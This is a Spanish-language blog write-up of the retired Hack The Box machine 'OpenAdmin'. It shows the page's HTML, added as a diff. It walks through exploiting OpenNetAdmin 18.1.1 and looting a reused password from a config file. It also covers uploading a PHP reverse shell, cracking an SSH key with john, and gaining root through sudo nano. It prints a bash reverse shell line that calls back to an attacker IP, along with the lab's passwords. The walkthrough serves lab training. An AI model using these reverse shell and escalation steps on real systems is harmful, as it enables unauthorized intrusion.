@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>HTB OpenAdmin Write-up (Español)</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB OpenAdmin Write-up (Español) | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="HTB OpenAdmin Write-up (Español)" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="I cloned my writeup that was originally posted on medium" />
+<meta property="og:description" content="I cloned my writeup that was originally posted on medium" />
+<link rel="canonical" href="http://localhost:8000/OpenAdmin-Espa%C3%B1ol" />
+<meta property="og:url" content="http://localhost:8000/OpenAdmin-Espa%C3%B1ol" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/OpenAdmin/1__iUvhxKVKR1HLGiQXZQEVYg.jpeg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-05-02T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/OpenAdmin/1__iUvhxKVKR1HLGiQXZQEVYg.jpeg" />
+<meta property="twitter:title" content="HTB OpenAdmin Write-up (Español)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2020-05-02T00:00:00-05:00","datePublished":"2020-05-02T00:00:00-05:00","description":"I cloned my writeup that was originally posted on medium","headline":"HTB OpenAdmin Write-up (Español)","image":"http://localhost:8000/assets/images/OpenAdmin/1__iUvhxKVKR1HLGiQXZQEVYg.jpeg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/OpenAdmin-Espa%C3%B1ol"},"url":"http://localhost:8000/OpenAdmin-Espa%C3%B1ol"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/OpenAdmin/1__iUvhxKVKR1HLGiQXZQEVYg.jpeg/../banner.png>
+  
+  <h2>HTB OpenAdmin Write-up (Español)</h2>
+  <time datetime="2020-05-02T00:00:00-05:00" class="by-line">02 May 2020</time>
+  <p>I cloned my writeup that was originally posted on <a href="https://medium.com/@5ubterranean/htb-openadmin-write-up-espa%C3%B1ol-9b29d4d36963">medium</a></p>
+
+<p>OpenAdmin es una máquina basada en Linux que estuvo activa desde el 4 de Enero hasta el 2 de Marzo de 2020, en total tendremos que tomar control de 3 diferentes usuarios antes de poder tener acceso a root.<br />
+Conseguiremos acceso inicial a través de una vulnerabilidad conocida en el sistema OpenNetAdmin que funciona en la máquina, luego de explorar los archivos a los que tenemos acceso encontraremos la contraseña del siguiente usuario, luego veremos que un tercer usuario está corriendo apache en un puerto que solo se puede acceder localmente, pero tenemos control sobre el directorio raiz de este, por lo que podremos subir una shell php y conseguir ejecución de comandos con ese tercer usuario, una vez el en tercer usuario extraeremos su clave privada de ssh, crackearmos la contraseña del archivo usando john y accederemos al este usuario a través de ssh, una vez ahí veremos que podemos ejecutar nano con privilegios de root sin ingresar una contraseña por lo que lo usaremos para elevar nuestros privilegios.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Empezamos usando masscan para encontrar todos los puertos disponibles y luego usamos nmap para conseguir más información de los mismos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan <span class="nt">-e</span> tun0 — <span class="nv">rate</span><span class="o">=</span>500 <span class="nt">-p</span> 0–65535 10.10.10.171  
+nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 80,22,59769 <span class="nt">-Pn</span> 10.10.10.171  
+PORT      STATE SERVICE    VERSION  
+22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>  
+| ssh-hostkey:   
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 <span class="o">(</span>RSA<span class="o">)</span>  
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 <span class="o">(</span>ECDSA<span class="o">)</span>  
+|<span class="se">\_</span>  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 <span class="o">(</span>ED25519<span class="o">)</span>  
+80/tcp    open  http       Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>  
+|<span class="se">\_</span>http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>  
+|<span class="se">\_</span>http-title: Apache2 Ubuntu Default Page: It works  
+59769/tcp open  tcpwrapped  
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux<span class="se">\_</span>kernel
+</code></pre></div></div>
+
+<p>Empezamos por el puerto 80, usamos gobuster para ver que directorios hay disponibles dentro de su página:<br />
+<code class="language-plaintext highlighter-rouge">gobuster dir -u http://10.10.10.171/ -w /usr/share/wordlists/dirb/common.txt</code> Esto nos devuelve 2 directorios “artwork” y “music”.<br />
+Empezamos revisando <code class="language-plaintext highlighter-rouge">http://10.10.10.171/artwork</code></p>
+
+<p><img src="/assets/images/OpenAdmin/1__5JFx__7A5RB03fgPbiL5vXg.png" alt="" /></p>
+
+<p>Tras revisarlo no encontramos nada interesante así que vamos a <code class="language-plaintext highlighter-rouge">http://10.10.10.171/music</code></p>
+
+<p><img src="/assets/images/OpenAdmin/1__WOtUBgQkg1E6ESORmK__5MQ.png" alt="" /></p>
+
+<p>Si hacemos click en “Login” el sitio nos llevará a <code class="language-plaintext highlighter-rouge">http://10.10.10.171/ona/</code></p>
+
+<p><img src="/assets/images/OpenAdmin/1__irAiBXTxNIHm__X7PE6wYKQ.png" alt="" /></p>
+
+<p>Luego de revisar el sitio nos damos cuenta que este sitio está corriendo <a href="https://opennetadmin.com/">OpenNetAdmin</a>, y como vemos en la imagen es la versión 18.1.1, así que usamos searchsploit para ver si encontramos alguna vulnerabilidad conocida.</p>
+
+<p><img src="/assets/images/OpenAdmin/1__brFYndnJEG986PQWaT1HWg.png" alt="" /></p>
+
+<h1 id="ganando-acceso">Ganando acceso</h1>
+
+<p>Usamos la vulnerabilidad disponible en <a href="https://www.exploit-db.com/exploits/47691">https://www.exploit-db.com/exploits/47691</a> aunque para tener más control copiamos el payload a burp y probamos si funciona.</p>
+
+<p><img src="/assets/images/OpenAdmin/1__PPdxqoxd6tUMq1ECAODyuQ.png" alt="" />
+<img src="/assets/images/OpenAdmin/1__qqRTp8w3ducXDXVKbBJmPA.png" alt="" /></p>
+
+<p>Perfecto, para evitar problemas con las peticiones http creamos un archivo con una shell reversa en bash, lo llamaremos “rev.sh”, y su contenido será <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.14.148/54321 0&gt;&amp;1</code>.<br />
+Iniciamos un servidor http con python 3:</p>
+
+<p><img src="/assets/images/OpenAdmin/1__vFOy70__3GUT2TF05yhO2rw.png" alt="" /></p>
+
+<p>Y enviamos una petición con burp que descargue nuestra shell y la envíe a bash para que se ejecute.</p>
+
+<p><img src="/assets/images/OpenAdmin/1__Snp3QNMa6o5n9do0uyEVIQ.png" alt="" /></p>
+
+<p>Y con esto tenemos nuestra shell inicial.</p>
+
+<p><img src="/assets/images/OpenAdmin/1__fJbhN2X5FGBEgSeHp2NBhQ.png" alt="" /></p>
+
+<h1 id="movimiento-lateral1">Movimiento lateral 1</h1>
+
+<p>El usuario con el que tenemos acceso es “www-data”, observamos que dentro de la máquina hay 2 usuarios disponibles “joanna” y “jimmy”, así que probablemente tendremos que ir a uno de ellos, empezamos buscando todos los archivos de configuración a los que tenemos acceso en busca de algunas credenciales, luego de un rato no encontramos con “database_settings.inc.php” en el directorio <code class="language-plaintext highlighter-rouge">/opt/ona/www/local/config</code>.</p>
+
+<p><img src="/assets/images/OpenAdmin/1__FFhfbeieyO__iRvT0ftlZeQ.png" alt="" /></p>
+
+<p>Muy bien tenemos la contraseña de la base de datos, “n1nj4W4rri0R!”, pero resulta que está también es la contraseña del usuario “jimmy”, al cual podemos acceder usando <code class="language-plaintext highlighter-rouge">su jummy</code> (para hacer esto hay que estar dentro de una shell más interactiva, por lo que antes creamos una con el comando: <code class="language-plaintext highlighter-rouge">python3 -c “import pty;pty.spawn(‘/bin/bash’)”</code>).</p>
+
+<p><img src="/assets/images/OpenAdmin/1__N2k4tO958IyQMsjrgEVnvg.png" alt="" /></p>
+
+<h1 id="movimiento-lateral2">Movimiento lateral 2</h1>
+
+<p>En la etapa anterior habíamos enumerado la máquina con ayuda de <a href="https://github.com/diego-treitos/linux-smart-enumeration">lse.sh</a> y habíamos observado dos cosas interesantes, primero que había un puerto que solo estaba escuchando localmente, el 52846, también estaba el 3306 pero ya que ese es de mysql no nos llamó la atención.</p>
+
+<p><img src="/assets/images/OpenAdmin/1__1ByFh__mE5vH5vQwTWHvt0g.png" alt="" /></p>
+
+<p>Y segundo que el usuario “joanna” era quien estaba corriendo el servicio de apache2 en la máquina.</p>
+
+<p><img src="/assets/images/OpenAdmin/1__SJaYYm0Mk4qGqhdMGZg8RQ.png" alt="" /></p>
+
+<p>De esto concluimos que joanna era quien estaba corriendo el servidor en el puerto 52846, ya que de ser quien corría el servidor en el puerto 80 habríamos conseguido acceso como ese usuario.</p>
+
+<p>Después de explorar un rato encontramos que el directorio raíz del servidor apache se encuentra en <code class="language-plaintext highlighter-rouge">/var/www/internal</code> carpeta de la cual “jimmy” es dueño, por lo que creamos un archivo “.rev.php” y copiamos la reverse shell de <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey</a> (mientras hacíamos algunos pasos anteriores nuestra shell se cayó, pero ya que teníamos las credenciales de jimmy regresamos a través de ssh).</p>
+
+<p><img src="/assets/images/OpenAdmin/1__MULkKZJpzZaGYoX5cK__l__Q.png" alt="" /></p>
+
+<p>Ahora solo tenemos que iniciar nuestro listener en nuestra máquina atacante y hacer una petición a nuestra shell desde la máquina objetivo usando <code class="language-plaintext highlighter-rouge">curl 127.0.0.1:52846/.rev.php</code>.</p>
+
+<p><img src="/assets/images/OpenAdmin/1__BgA__V__lOyZIMu4MrcLV0ow.png" alt="" /></p>
+
+<p>Y tras esto conseguimos el archivo <strong><em>user.txt</em></strong>.</p>
+
+<h1 id="escalación-de-privilegios">Escalación de privilegios</h1>
+
+<p>Entramos a la carpeta “.ssh” de joanna y nos encontramos con sus llaves ssh.</p>
+
+<p><img src="/assets/images/OpenAdmin/1__TEbnQ6EdZGlE4iw9iMETGA.png" alt="" /></p>
+
+<p>Copiamos el contenido de su llave privada, id_rsa (en este caso lo renombramos como “joanaid”), esta llave necesita una contraseña para ser usada, así que la convertimos a un formato que john pueda entender usando ssh2john, y procedemos a crackearla.</p>
+
+<p><img src="/assets/images/OpenAdmin/1__boQ756vYdGsX5iSWdojx0A.png" alt="" /></p>
+
+<p>Y la contraseña es “bloodninjas”, procedemos a conectarnos a través de ssh usando: <code class="language-plaintext highlighter-rouge">ssh -i joanaid joanna@10.10.10.171</code>.<br />
+En el contexto anterior no podíamos usar “sudo” así que volvemos a revisar si tenemos alguna capacidad.</p>
+
+<p><img src="/assets/images/OpenAdmin/1__vq33eY0XNFdM8HO__5Cxeyw.png" alt="" /></p>
+
+<p>Bien, podemos usar nano para editar el archivo “/opt/priv”, revisamos si podemos usar esto para escalar privilegios consultando <a href="https://gtfobins.github.io/gtfobins/nano/">gtfobins</a>, y resulta que sí podemos, para hacerlos ejecutamos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nano /opt/priv  
+Luego presionamos Ctrl + r y Ctrl + x  
+reset; sh 1&gt;&amp;0 2&gt;&amp;0
+</code></pre></div></div>
+
+<p>Y con esto tendremos una shell con privilegios de root en la máquina, quizás no sea muy cómoda pero podríamos generar una nueva aunque a este punto ya no hace falta.</p>
+
+<p><img src="/assets/images/OpenAdmin/1__dSiwZS__gbQyqoNvgnJZrHg.png" alt="" /></p>
+
+<h1 id="descargo-de-responsabilidad">Descargo de responsabilidad</h1>
+
+<p>Todos los recursos brindados en este post se hicieron puramente con fines educativos y de concientización, el autor no se hace responsable por las acciones que las personas puedan realizar con el contenido del mismo.</p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
